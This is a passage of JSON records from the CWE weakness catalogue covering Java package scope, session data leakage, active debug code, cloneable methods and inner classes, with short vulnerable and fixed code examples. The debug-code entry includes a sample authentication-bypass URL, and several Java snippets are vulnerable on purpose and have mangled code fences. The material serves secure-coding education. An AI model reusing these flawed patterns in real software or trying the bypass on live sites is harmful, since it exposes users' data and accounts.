          "EntryName": "Compare classes and not class names"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        },
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "487",
      "Name": "Reliance on Package-level Scope",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Java packages are not inherently closed; therefore, relying on them for code security is not a good practice.",
      "ExtendedDescription": "The purpose of package scope is to prevent accidental access by other parts of a program. This is an ease-of-software-development feature but not a security feature.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "Any data in a Java package can be accessed outside of the Java framework if the package is distributed."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "The data in a Java class can be modified by anyone outside of the Java framework if the packages is distributed."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "Data should be private static and final whenever possible. This will assure that your code is protected by instantiating early, preventing access and tampering."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example demonstrates the weakness."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpackage math;\n\tpublic class Lebesgue implements Integration{\n\t\t\tpublic final Static String youAreHidingThisFunction(functionToIntegrate){\n\t\t\t\t\treturn ...;\n\t\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Relying on package-level scope"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "MET04-J",
          "EntryName": "Do not increase the accessibility of overridden or hidden methods"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "488",
      "Name": "Exposure of Data Element to Wrong Session",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not sufficiently enforce boundaries between the states of different sessions, causing data to be provided to, or used by, the wrong session.",
      "ExtendedDescription": "\n\nData can \"bleed\" from one session to another through member variables of singleton objects, such as Servlets, and objects from a shared pool.\n\n\nIn the case of Servlets, developers sometimes do not understand that, unless a Servlet implements the SingleThreadModel interface, the Servlet is a singleton; there is only one instance of the Servlet, and that single instance is used and re-used to handle multiple requests that are processed simultaneously by different threads. A common result is that developers use Servlet member fields in such a way that one user may inadvertently see another user's data. In other words, storing user data in Servlet member fields introduces a data access race condition.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Protect the application's sessions from information leakage. Make sure that a session's data is not used or visible by other sessions."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use a static analysis tool to scan the code for information leakage vulnerabilities (e.g. Singleton Member Field)."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "In a multithreading environment, storing user data in Servlet member fields introduces a data access race condition. Do not use member fields to store information in the Servlet."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following Servlet stores the value of a request parameter in a member field and then later echoes the parameter value to the response output stream."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class GuestBook extends HttpServlet {\n\t\t\tString name;\n\t\t\tprotected void doPost (HttpServletRequest req, HttpServletResponse res) {\n\t\t\t\tname = req.getParameter(\"name\");\n\t\t\t\t...\n\t\t\t\tout.println(name + \", thanks for visiting!\");\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "While this code will work perfectly in a single-user environment, if two users access the Servlet at approximately the same time, it is possible for the two request handler threads to interleave in the following way: Thread 1: assign \"Dick\" to name Thread 2: assign \"Jane\" to name Thread 1: print \"Jane, thanks for visiting!\" Thread 2: print \"Jane, thanks for visiting!\" Thereby showing the first user the second user's name."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Data Leaking Between Users"
        }
      ],
      "RelatedAttackPatterns": [
        "59",
        "60"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "489",
      "Name": "Active Debug Code",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product is deployed to unauthorized actors with debugging code still enabled or active, which can create unintended entry points or expose sensitive information.",
      "ExtendedDescription": "A common development practice is to add \"back door\" code specifically designed for debugging or testing purposes that is not intended to be shipped or deployed with the product. These back door entry points create security risks because they are not considered during design or testing and fall outside of the expected operating conditions of the product.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "215",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        },
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Leftover debug code",
          "Description": "This term originates from Seven Pernicious Kingdoms"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "In web-based applications, debug code is used to test and modify web application properties, configuration information, and functions. If a debug application is left on a production server, this oversight during the \"software process\" allows attackers access to debug functionality."
        },
        {
          "Phase": "Build and Compilation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability",
            "Access Control",
            "Other"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Read Application Data",
            "Gain Privileges or Assume Identity",
            "Varies by Context"
          ],
          "Note": "The severity of the exposed debug application will depend on the particular instance. At the least, it will give an attacker sensitive information about the settings and mechanics of web applications on the server. At worst, as is often the case, the debug application will allow an attacker complete control over the web application and server, as well as confidential information that either of these access."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Build and Compilation",
            "Distribution"
          ],
          "Description": "Remove debug code before deploying the application."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Debug code can be used to bypass authentication. For example, suppose an application has a login script that receives a username and a password. Assume also that a third, optional, parameter, called \"debug\", is interpreted by the script as requesting a switch to debug mode, and that when this parameter is given the username and password are not checked. In such a case, it is very simple to bypass the authentication process if the special behavior of the application regarding the debug parameter is known. In a case where the form is:"
            },
            {
              "Nature": "Bad",
              "Language": "HTML",
              "ExampleCode": "```\n\t<FORM ACTION=\"/authenticate_login.cgi\">\n\t\t<INPUT TYPE=TEXT name=username>\n\t\t<INPUT TYPE=PASSWORD name=password>\n\t\t<INPUT TYPE=SUBMIT>\n\t</FORM>\n```"
            },
            {
              "BodyText": "Then a conforming link will look like:"
            },
            {
              "Nature": "Informative",
              "ExampleCode": "```\n\thttp://TARGET/authenticate_login.cgi?username=...&password=...\n```"
            },
            {
              "BodyText": "An attacker can change this to:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\thttp://TARGET/authenticate_login.cgi?username=&password=&debug=1\n```"
            },
            {
              "BodyText": "Which will grant the attacker access to the site, bypassing the authentication process."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Leftover Debug Code"
        },
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A10",
          "EntryName": "Insecure Configuration Management",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP28",
          "EntryName": "Unexpected access points"
        }
      ],
      "RelatedAttackPatterns": [
        "121",
        "661"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Other",
          "Note": "In J2EE a main method may be a good indicator that debug code has been left in the application, although there may not be any direct security impact."
        }
      ]
    },
    {
      "ID": "491",
      "Name": "Public cloneable() Method Without Final ('Object Hijack')",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "A class has a cloneable() method that is not declared final, which allows an object to be created without calling the constructor. This can cause the object to be in an unexpected state.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Unexpected State",
            "Varies by Context"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Make the cloneable() method final."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In this example, a public class \"BankAccount\" implements the cloneable() method which declares \"Object clone(string accountnumber)\":"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class BankAccount implements Cloneable{\n\t\t\tpublic Object clone(String accountnumber) throws\n\t\t\tCloneNotSupportedException\n\t\t\t{\n\t\t\t\t\tObject returnMe = new BankAccount(account number);\n\t\t\t\t\t...\n\t\t\t}\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the example below, a clone() method is defined without being declared final."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprotected Object clone() throws CloneNotSupportedException {\n\t\t...\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Mobile Code: Object Hijack"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "OBJ07-J",
          "EntryName": "Sensitive classes must not let themselves be copied"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP28",
          "EntryName": "Unexpected access points"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        },
        {
          "ExternalReferenceID": "REF-453",
          "Authors": [
            "OWASP"
          ],
          "Title": "OWASP , Attack Category : Mobile code: object hijack",
          "URL": "http://www.owasp.org/index.php/Mobile_code:_object_hijack"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "492",
      "Name": "Use of Inner Class Containing Sensitive Data",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "Inner classes are translated into classes that are accessible at package scope and may expose code that the programmer intended to keep private to attackers.",
      "ExtendedDescription": "Inner classes quietly introduce several security concerns because of the way they are translated into Java bytecode. In Java source code, it appears that an inner class can be declared to be accessible only by the enclosing class, but Java bytecode has no concept of an inner class, so the compiler must transform an inner class declaration into a peer class with package level access to the original outer class. More insidiously, since an inner class can access private fields in its enclosing class, once an inner class becomes a peer class in bytecode, the compiler converts private fields accessed by the inner class into protected fields.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "\"Inner Classes\" data confidentiality aspects can often be overcome."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Using sealed classes protects object-oriented encapsulation paradigms and therefore protects code from being extended in unforeseen ways."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Inner Classes do not provide security. Warning: Never reduce the security of the object from an outer class, going to an inner class. If an outer class is final or private, ensure that its inner class is private as well."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following Java Applet code mistakenly makes use of an inner class."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic final class urlTool extends Applet {\n\t\tprivate final class urlHelper {\n\t\t\t...\n\t\t}\n\t\t...\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following example shows a basic use of inner classes. The class OuterClass contains the private member inner class InnerClass. The private inner class InnerClass includes the method concat that accesses the private member variables of the class OuterClass to output the value of one of the private member variables of the class OuterClass and returns a string that is a concatenation of one of the private member variables of the class OuterClass, the separator input parameter of the method and the private member variable of the class InnerClass."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class OuterClass {\n```\n// private member variables of OuterClass* \n\t\tprivate String memberOne;\n\t\tprivate String memberTwo;\n\t\t\n\t\t\n\t\t *// constructor of OuterClass* \n\t\tpublic OuterClass(String varOne, String varTwo) {\n\t\t```\n\t\t\tthis.memberOne = varOne;\n\t\t\tthis.memberTwo = varTwo;\n\t\t}\n```\n// InnerClass is a member inner class of OuterClass* \n\t\tprivate class InnerClass {\n\t\t```\n\t\t\tprivate String innerMemberOne;\n\t\t\tpublic InnerClass(String innerVarOne) {\n\t\t\t\tthis.innerMemberOne = innerVarOne;\n\t\t\t}\n\t\t\tpublic String concat(String separator) {\n```\n// InnerClass has access to private member variables of OuterClass* \n\t\t\t\tSystem.out.println(\"Value of memberOne is: \" + memberOne);\n\t\t\t\treturn OuterClass.this.memberTwo + separator + this.innerMemberOne;}}}"
            },
            {
              "BodyText": "Although this is an acceptable use of inner classes it demonstrates one of the weaknesses of inner classes that inner classes have complete access to all member variables and methods of the enclosing class even those that are declared private and protected. When inner classes are compiled and translated into Java bytecode the JVM treats the inner class as a peer class with package level access to the enclosing class."
            },
            {
              "BodyText": "To avoid this weakness of inner classes, consider using either static inner classes, local inner classes, or anonymous inner classes."
            },
            {
              "BodyText": "The following Java example demonstrates the use of static inner classes using the previous example. The inner class InnerClass is declared using the static modifier that signifies that InnerClass is a static member of the enclosing class OuterClass. By declaring an inner class as a static member of the enclosing class, the inner class can only access other static members and methods of the enclosing class and prevents the inner class from accessing nonstatic member variables and methods of the enclosing class. In this case the inner class InnerClass can only access the static member variable memberTwo of the enclosing class OuterClass but cannot access the nonstatic member variable memberOne."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class OuterClass {\n```\n// private member variables of OuterClass* \n\t\t\tprivate String memberOne;\n\t\t\tprivate static String memberTwo;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor of OuterClass* \n\t\t\tpublic OuterClass(String varOne, String varTwo) {\n\t\t\t\n\t\t\t```\n\t\t\t\tthis.memberOne = varOne;\n\t\t\t\tthis.memberTwo = varTwo;\n\t\t\t}\n```\n// InnerClass is a static inner class of OuterClass* \n\t\t\tprivate static class InnerClass {\n\t\t\t```\n\t\t\t\t\tprivate String innerMemberOne;\n\t\t\t\t\tpublic InnerClass(String innerVarOne) {\n\t\t\t\t\t\tthis.innerMemberOne = innerVarOne;\n\t\t\t\t\t}\n\t\t\t\t\tpublic String concat(String separator) {\n```\n// InnerClass only has access to static member variables of OuterClass* \n\t\t\t\t\t\t\treturn memberTwo + separator + this.innerMemberOne;}}}"
            },
            {
              "BodyText": "The only limitation with using a static inner class is that as a static member of the enclosing class the inner class does not have a reference to instances of the enclosing class. For many situations this may not be ideal. An alternative is to use a local inner class or an anonymous inner class as shown in the next examples."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following example the BankAccount class contains the private member inner class InterestAdder that adds interest to the bank account balance. The start method of the BankAccount class creates an object of the inner class InterestAdder, the InterestAdder inner class implements the ActionListener interface with the method actionPerformed. A Timer object created within the start method of the BankAccount class invokes the actionPerformed method of the InterestAdder class every 30 days to add the interest to the bank account balance based on the interest rate passed to the start method as an input parameter. The inner class InterestAdder needs access to the private member variable balance of the BankAccount class in order to add the interest to the bank account balance."
            },
            {
              "BodyText": "However as demonstrated in the previous example, because InterestAdder is a non-static member inner class of the BankAccount class, InterestAdder also has access to the private member variables of the BankAccount class - including the sensitive data contained in the private member variables for the bank account owner's name, Social Security number, and the bank account number."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class BankAccount {\n```\n// private member variables of BankAccount class* \n\t\t\tprivate String accountOwnerName;\n\t\t\tprivate String accountOwnerSSN;\n\t\t\tprivate int accountNumber;\n\t\t\tprivate double balance;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor for BankAccount class* \n\t\t\tpublic BankAccount(String accountOwnerName, String accountOwnerSSN,\n\t\t\tint accountNumber, double initialBalance, int initialRate)\n\t\t\t{\n\t\t\t```\n\t\t\t\tthis.accountOwnerName = accountOwnerName;\n\t\t\t\tthis.accountOwnerSSN = accountOwnerSSN;\n\t\t\t\tthis.accountNumber = accountNumber;\n\t\t\t\tthis.balance = initialBalance;\n\t\t\t\tthis.start(initialRate);\n\t\t\t}\n```\n// start method will add interest to balance every 30 days* \n\t\t\t\n\t\t\t\n\t\t\t *// creates timer object and interest adding action listener object* \n\t\t\tpublic void start(double rate)\n\t\t\t{\n\t\t\t```\n\t\t\t\tActionListener adder = new InterestAdder(rate);\n\t\t\t\tTimer t = new Timer(1000 * 3600 * 24 * 30, adder);\n\t\t\t\tt.start();\n\t\t\t}\n```\n// InterestAdder is an inner class of BankAccount class* \n\t\t\t\n\t\t\t\n\t\t\t *// that implements the ActionListener interface* \n\t\t\tprivate class InterestAdder implements ActionListener\n\t\t\t{\n\t\t\t```\n\t\t\t\t\tprivate double rate;\n\t\t\t\t\tpublic InterestAdder(double aRate)\n\t\t\t\t\t{\n\t\t\t\t\t\tthis.rate = aRate;\n\t\t\t\t\t}\n\t\t\t\t\tpublic void actionPerformed(ActionEvent event)\n\t\t\t\t\t{\n```\n// update interest* \n\t\t\t\t\t\t\tdouble interest = BankAccount.this.balance * rate / 100;\n\t\t\t\t\t\t\tBankAccount.this.balance += interest;}\n\t\t\t\t\t}}"
            },
            {
              "BodyText": "In the following example the InterestAdder class from the above example is declared locally within the start method of the BankAccount class. As a local inner class InterestAdder has its scope restricted to the method (or enclosing block) where it is declared, in this case only the start method has access to the inner class InterestAdder, no other classes including the enclosing class has knowledge of the inner class outside of the start method. This allows the inner class to access private member variables of the enclosing class but only within the scope of the enclosing method or block."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class BankAccount {\n```\n// private member variables of BankAccount class* \n\t\t\tprivate String accountOwnerName;\n\t\t\tprivate String accountOwnerSSN;\n\t\t\tprivate int accountNumber;\n\t\t\tprivate double balance;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor for BankAccount class* \n\t\t\tpublic BankAccount(String accountOwnerName, String accountOwnerSSN,\n\t\t\tint accountNumber, double initialBalance, int initialRate)\n\t\t\t{\n\t\t\t```\n\t\t\t\tthis.accountOwnerName = accountOwnerName;\n\t\t\t\tthis.accountOwnerSSN = accountOwnerSSN;\n\t\t\t\tthis.accountNumber = accountNumber;\n\t\t\t\tthis.balance = initialBalance;\n\t\t\t\tthis.start(initialRate);\n\t\t\t}\n```\n// start method will add interest to balance every 30 days* \n\t\t\t\n\t\t\t\n\t\t\t *// creates timer object and interest adding action listener object* \n\t\t\tpublic void start(final double rate)\n\t\t\t{\n\t\t\t```\n```\n// InterestAdder is a local inner class* \n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// that implements the ActionListener interface* \n\t\t\t\t\tclass InterestAdder implements ActionListener\n\t\t\t\t\t{\n\t\t\t\t\t```\n\t\t\t\t\t\t\tpublic void actionPerformed(ActionEvent event)\n\t\t\t\t\t\t\t{\n```\n// update interest* \n\t\t\t\t\t\t\t\t\tdouble interest = BankAccount.this.balance * rate / 100;\n\t\t\t\t\t\t\t\t\tBankAccount.this.balance += interest;}}\n\t\t\t\t\tActionListener adder = new InterestAdder();\n\t\t\t\t\tTimer t = new Timer(1000 * 3600 * 24 * 30, adder);\n\t\t\t\t\tt.start();}}"
            },
            {
              "BodyText": "A similar approach would be to use an anonymous inner class as demonstrated in the next example. An anonymous inner class is declared without a name and creates only a single instance of the inner class object. As in the previous example the anonymous inner class has its scope restricted to the start method of the BankAccount class."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class BankAccount {\n```\n// private member variables of BankAccount class* \n\t\t\tprivate String accountOwnerName;\n\t\t\tprivate String accountOwnerSSN;\n\t\t\tprivate int accountNumber;\n\t\t\tprivate double balance;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor for BankAccount class* \n\t\t\tpublic BankAccount(String accountOwnerName, String accountOwnerSSN,\n\t\t\tint accountNumber, double initialBalance, int initialRate)\n\t\t\t{\n\t\t\t```\n\t\t\t\tthis.accountOwnerName = accountOwnerName;\n\t\t\t\tthis.accountOwnerSSN = accountOwnerSSN;\n\t\t\t\tthis.accountNumber = accountNumber;\n\t\t\t\tthis.balance = initialBalance;\n\t\t\t\tthis.start(initialRate);\n\t\t\t}\n```\n// start method will add interest to balance every 30 days* \n\t\t\t\n\t\t\t\n\t\t\t *// creates timer object and interest adding action listener object* \n\t\t\tpublic void start(final double rate)\n\t\t\t{\n\t\t\t```\n```\n// anonymous inner class that implements the ActionListener interface* \n\t\t\t\t\tActionListener adder = new ActionListener()\n\t\t\t\t\t{\n\t\t\t\t\t```\n\t\t\t\t\t\t\tpublic void actionPerformed(ActionEvent event)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t double interest = BankAccount.this.balance * rate / 100; \n\t\t\t\t\t\t\t\t\tBankAccount.this.balance += interest;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t};\n\t\t\t\t\tTimer t = new Timer(1000 * 3600 * 24 * 30, adder);\n\t\t\t\t\tt.start();\n\t\t\t}\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following Java example a simple applet provides the capability for a user to input a URL into a text field and have the URL opened in a new browser window. The applet contains an inner class that is an action listener for the submit button, when the user clicks the submit button the inner class action listener's actionPerformed method will open the URL entered into the text field in a new browser window. As with the previous examples using inner classes in this manner creates a security risk by exposing private variables and methods. Inner classes create an additional security risk with applets as applets are executed on a remote machine through a web browser within the same JVM and therefore may run side-by-side with other potentially malicious code."
            },
            {
              "Nature": "Bad",
